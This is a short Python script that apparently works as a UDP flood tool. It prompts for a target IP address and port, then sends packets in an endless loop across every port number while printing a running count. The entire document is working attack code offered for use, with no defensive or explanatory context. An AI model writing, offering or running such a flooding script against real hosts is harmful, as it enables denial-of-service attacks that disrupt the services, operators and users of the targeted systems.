import socket,time

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

ip = (input("IP Target : "))
port = int(input("Port       : "))
Format = "utf-8"

sent = 0
while True:
     if port == 65535:
          port=0
     sock.sendto(bytes("128",Format), (ip,port))
     sent = sent + 1
     port = port + 1
     print("Sent %s packet to %s throught port:%s"%(sent,ip,port))
